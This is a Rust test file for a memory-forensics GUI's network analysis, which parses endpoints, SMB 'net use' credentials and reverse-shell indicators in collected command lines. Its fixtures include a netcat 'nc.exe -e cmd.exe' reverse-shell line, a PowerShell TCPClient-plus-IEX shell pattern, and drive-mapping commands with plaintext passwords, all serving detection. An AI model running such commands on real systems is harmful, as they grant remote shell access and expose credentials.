use serde_json::json;
use std::{
    fs,
    sync::atomic::{AtomicBool, AtomicU64},
};
use volgui::{
    analyses::AnalysisDraft,
    analysis::{self, network},
    artifacts::{ArtifactGroup, OperatingSystem},
    case::{Case, Evidence, RunStatus},
    network::{Endpoint, Entry, Graph, Selection},
    results::{Query, ResultStore, StoredRecord},
    settings::Settings,
    volatility::{Installation, Outcome, Plugin, Table},
};

fn entry(value: serde_json::Value) -> Entry {
    Entry::from_record(StoredRecord {
        id: 1,
        run_id: "fixture".into(),
        row: 0,
        record: Table::parse(&json!([value]).to_string())
            .unwrap()
            .rows
            .remove(0),
    })
}

#[test]
fn endpoint_selection_matches_address_and_port_on_the_same_side() {
    let e = entry(
        json!({"LocalAddr":"10.0.0.1","LocalPort":50000,"ForeignAddr":"10.0.0.2","ForeignPort":445}),
    );
    assert!(
        Selection::Endpoint(Endpoint {
            address: "10.0.0.2".into(),
            port: Some(445)
        })
        .matches(&e)
    );
    assert!(
        !Selection::Endpoint(Endpoint {
            address: "10.0.0.1".into(),
            port: Some(445)
        })
        .matches(&e)
    );
    assert!(Selection::Address("10.0.0.1".into()).matches(&e));
    assert!(!Selection::Address("10.0.0.10".into()).matches(&e));
    let missing = entry(json!({"LocalAddr":"10.0.0.1"}));
    let selection = Selection::Endpoint(Endpoint {
        address: "10.0.0.1".into(),
        port: None,
    });
    assert!(selection.matches(&missing));
    assert!(!selection.matches(&e));
}

#[test]
fn normalization_retains_ipv6_scopes_wildcards_zero_and_unknown_ports() {
    let e =
        entry(json!({"LocalAddr":"[2001:0db8::1]:443","RemoteAddr":"fe80::a%12","RemotePort":"0"}));
    assert_eq!(e.local.unwrap().label(), "[2001:db8::1]:443");
    assert_eq!(e.remote.unwrap().label(), "[fe80::a%12]:0");
    let e = entry(json!({"LocalAddr":"0.0.0.0","LocalPort":0,"ForeignAddr":"*","ForeignPort":"*"}));
    assert_eq!(e.local.unwrap().port, Some(0));
    assert_eq!(e.remote.unwrap().address, "*");
    let e = entry(json!({"LocalAddr":"not an address","LocalPort":70000}));
    assert!(e.local.is_none());
}

#[test]
fn drive_commands_preserve_explicit_credentials_and_do_not_invent_prompted_passwords() {
    for text in [
        r"net use n: /user:DOMAIN\alice \\10.0.0.2\share Pa55word!",
        r#"net use n: \\10.0.0.2\share "Pa55 word!" /user:DOMAIN\alice"#,
    ] {
        let rows = network::parse_text(text);
        let r = rows
            .iter()
            .find(|r| r.text("Finding") == "Network drive command")
            .unwrap();
        assert_eq!(r.text("Username"), r"DOMAIN\alice");
        assert!(r.text("Password").starts_with("Pa55"));
    }
    let rows = network::parse_text(
        r#"Run "net use n: /user:alice \\10.0.0.2\share Pa55word!" Sleep 10000"#,
    );
    assert_eq!(rows[0].text("Password"), "Pa55word!");
    for text in [
        r"net use n: \\10.0.0.2\share * /user:alice",
        r"net use n: \\10.0.0.2\share /user:alice",
    ] {
        assert!(network::parse_text(text)[0].text("Password").is_empty());
    }
    assert!(
        network::parse_text(r"\\server\share").is_empty(),
        "A hostname is not an IP without separate resolution evidence"
    );
}

#[test]
fn reverse_shell_labels_require_command_syntax_or_configuration() {
    let rows = network::parse_text("powershell New-Object Net.Sockets.TCPClient('10.0.0.2',4444)");
    assert_eq!(rows[0].text("Finding"), "TCP client command");
    let rows =
        network::parse_text("New-Object Net.Sockets.TCPClient('10.0.0.2',4444); IEX $command");
    assert_eq!(rows[0].text("Finding"), "Reverse shell command candidate");
    assert_eq!(
        network::parse_text("nc.exe -e cmd.exe 10.0.0.2 4444")[0].text("Port"),
        "4444"
    );
    assert!(network::parse_text("nc.exe -l -e cmd.exe 10.0.0.2 4444").is_empty());
    assert_eq!(
        network::parse_text("tcp://10.0.0.2:5059")[0].text("Finding"),
        "TCP transport endpoint"
    );
    assert!(network::parse_text("tcp://10.0.0.2:99999").is_empty());
}

#[test]
fn chained_drive_commands_do_not_share_credentials_or_match_ip_prefixes() {
    let text = r"net use k: \\10.0.0.2\home pass1 /user:bob & net use l: \\10.0.0.2\public /user:alice pass2";
    let rows = network::parse_text(text);
    assert_eq!(rows.len(), 2);
    assert_eq!(rows[0].text("Password"), "pass1");
    assert_eq!(rows[0].text("Username"), "bob");
    assert_eq!(rows[1].text("Password"), "pass2");
    assert_eq!(rows[1].text("Username"), "alice");
    let rows =
        network::parse_text(r"net use k: \\10.0.0.20\home pass1 /user:bob & echo \\10.0.0.2\home");
    assert_eq!(rows[1].text("Finding"), "SMB share reference");
    assert!(rows[1].text("Password").is_empty());
    assert!(
        network::parse_text(r"net use k: \\10.0.0.2\home n:")[0]
            .text("Password")
            .is_empty()
    );
}

fn case() -> (tempfile::TempDir, Case, Evidence) {
    case_with_contents(b"synthetic network capture")
}

fn case_with_contents(contents: &[u8]) -> (tempfile::TempDir, Case, Evidence) {
    let temp = tempfile::tempdir().unwrap();
    let path = temp.path().join("capture.raw");
    fs::write(&path, contents).unwrap();
    let mut evidence = Evidence::inspect(&path, &AtomicBool::new(false), |_, _| {}).unwrap();
    evidence.operating_system = OperatingSystem::Windows;
    let mut case = Case::create(&temp.path().join("case"), "Network fixture").unwrap();
    case.add_evidence(evidence.clone()).unwrap();
    (temp, case, evidence)
}

#[test]
fn graph_keeps_identical_occurrences_across_runs_and_rejects_stale_requests() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.netscan.NetScan".into(),
            description: String::new(),
        }],
    };
    let table=Table::parse(&json!([{"LocalAddr":"10.0.0.1","LocalPort":55000,"ForeignAddr":"10.0.0.2","ForeignPort":445}]).to_string()).unwrap();
    let mut ids = Vec::new();
    for _ in 0..2 {
        let run = engine
            .prepare(
                &evidence,
                "windows.netscan.NetScan",
                vec![],
                &case.directory.join("analyses"),
            )
            .unwrap();
        case.queue(run.clone()).unwrap();
        case.finish(
            &run.id,
            &Outcome {
                status: RunStatus::Completed,
                exit_code: Some(0),
                table: Some(table.clone()),
                message: String::new(),
            },
        )
        .unwrap();
        ids.push(run.id);
    }
    let store = ResultStore::at(&case.directory);
    let query = Query {
        runs: ids,
        text: "a graph search must not hide sidebar occurrences".into(),
        ..Default::default()
    };
    let graph = Graph::load(&store, &query, 7, &AtomicU64::new(7))
        .unwrap()
        .unwrap();
    assert_eq!(graph.entries.len(), 2);
    assert_ne!(
        graph.entries[0].source.run_id,
        graph.entries[1].source.run_id
    );
    let endpoint = Selection::Endpoint(Endpoint {
        address: "10.0.0.2".into(),
        port: Some(445),
    });
    assert_eq!(graph.selected_indices(Some(&endpoint)).len(), 2);
    assert!(graph.contains_selection(&endpoint));
    assert!(!graph.contains_selection(&Selection::Endpoint(Endpoint {
        address: "10.0.0.2".into(),
        port: Some(443)
    })));
    let filter = volgui::network::Filter {
        focus: Some("10.0.0.1".into()),
        text: "missing".into(),
        ..Default::default()
    };
    assert_eq!(graph.overview(&filter).matching, 0);
    assert_eq!(graph.selected_indices(Some(&endpoint)).len(), 2);
    assert!(
        Graph::load(&store, &query, 7, &AtomicU64::new(8))
            .unwrap()
            .is_none()
    );
    let directory = case.directory.clone();
    drop(case);
    let reopened = Case::open(&directory).unwrap();
    assert_eq!(
        ResultStore::at(&reopened.directory)
            .network_ids(&query.runs)
            .unwrap()
            .len(),
        2
    );
}

#[test]
fn native_analysis_retains_inventory_ports_and_exact_source_provenance() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.cmdline.CmdLine".into(),
            description: String::new(),
        }],
    };
    let source = engine
        .prepare(
            &evidence,
            "windows.cmdline.CmdLine",
            vec![],
            &case.directory.join("analyses"),
        )
        .unwrap();
    case.queue(source.clone()).unwrap();
    let table = Table::parse(
        &json!([{"PID":42,"Args":"tcp://10.0.0.2:80 tcp://10.0.0.2:443"}]).to_string(),
    )
    .unwrap();
    case.finish(
        &source.id,
        &Outcome {
            status: RunStatus::Completed,
            exit_code: Some(0),
            table: Some(table),
            message: String::new(),
        },
    )
    .unwrap();
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    let table = outcome.table.as_ref().unwrap();
    assert_eq!(table.rows.len(), 2);
    for row in &table.rows {
        assert_eq!(row.text("Source run"), source.id);
        assert_eq!(row.text("Source row"), "0");
        assert_eq!(row.text("Source field"), "Args");
        assert_eq!(row.text("Evidence SHA-256"), evidence.sha256);
    }
    assert!(outcome.message.contains("unavailable or not completed"));
    case.finish(&run.id, &outcome).unwrap();
    assert_eq!(case.results(&run.id).unwrap().rows.len(), 2);
}

#[test]
fn chooser_collects_available_sources_and_queues_a_native_barrier() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: [
            "windows.netscan.NetScan",
            "windows.pslist.PsList",
            "windows.cmdline.CmdLine",
        ]
        .into_iter()
        .map(|p| Plugin {
            id: p.into(),
            description: String::new(),
        })
        .collect(),
    };
    let mut draft = AnalysisDraft::new(&evidence);
    draft.selected.insert(analysis::NETWORK.into());
    let jobs = draft.prepare_in_case(&engine, &evidence, &case).unwrap();
    assert_eq!(jobs.len(), 4);
    assert_eq!(jobs.last().unwrap().plugin, analysis::NETWORK);
    assert!(
        jobs[..3]
            .iter()
            .all(|r| network::SOURCES.contains(&r.plugin.as_str()))
    );
    case.queue_batch(jobs.clone()).unwrap();
    let again = draft.prepare_in_case(&engine, &evidence, &case).unwrap();
    assert_eq!(again.len(), 1);
    let mut running = jobs;
    running[0].status = RunStatus::Completed;
    running[1].status = RunStatus::Running;
    running[2].status = RunStatus::Completed;
    assert!(
        volgui::analyses::next_queued_run(&running, std::num::NonZeroUsize::new(5).unwrap())
            .is_none()
    );
    assert_eq!(
        ArtifactGroup::for_plugin(analysis::NETWORK),
        ArtifactGroup::Network
    );
    assert!(analysis::prepare(&evidence, analysis::NETWORK, vec!["unexpected".into()]).is_err());
}

#[test]
fn network_analysis_does_not_search_credentials_or_payloads_in_raw_memory() {
    let (_temp, mut case, evidence) = case_with_contents(
        br"net use n: /user:alice \\10.0.0.2\share Password123! tcp://10.0.0.3:5059",
    );
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    assert!(
        outcome.table.unwrap().rows.is_empty(),
        "Network preprocessing must not recover strings from acquisition bytes"
    );
    assert!(outcome.message.contains("no raw memory string scan"));
}

#[test]
fn network_credentials_must_come_from_an_explicit_drive_command_in_a_collected_record() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.cmdline.CmdLine".into(),
            description: String::new(),
        }],
    };
    let source = engine
        .prepare(
            &evidence,
            "windows.cmdline.CmdLine",
            vec![],
            &case.directory.join("analyses"),
        )
        .unwrap();
    case.queue(source.clone()).unwrap();
    let table = Table::parse(
        &json!([
            {"PID":42,"Args":r"net use n: /user:alice \\10.0.0.2\share Password123!"},
            {"PID":43,"Args":"Username=bob Password=unrelated_secret"}
        ])
        .to_string(),
    )
    .unwrap();
    case.finish(
        &source.id,
        &Outcome {
            status: RunStatus::Completed,
            exit_code: Some(0),
            table: Some(table),
            message: String::new(),
        },
    )
    .unwrap();
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    let rows = outcome.table.unwrap().rows;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].text("Username"), "alice");
    assert_eq!(rows[0].text("Password"), "Password123!");
    assert_eq!(rows[0].text("IP"), "10.0.0.2");
    assert_eq!(rows[0].text("Source run"), source.id);
    assert_eq!(rows[0].text("Source row"), "0");
    assert_eq!(rows[0].text("Source field"), "Args");
    assert_eq!(rows[0].text("Source type"), "Engine record text");
}
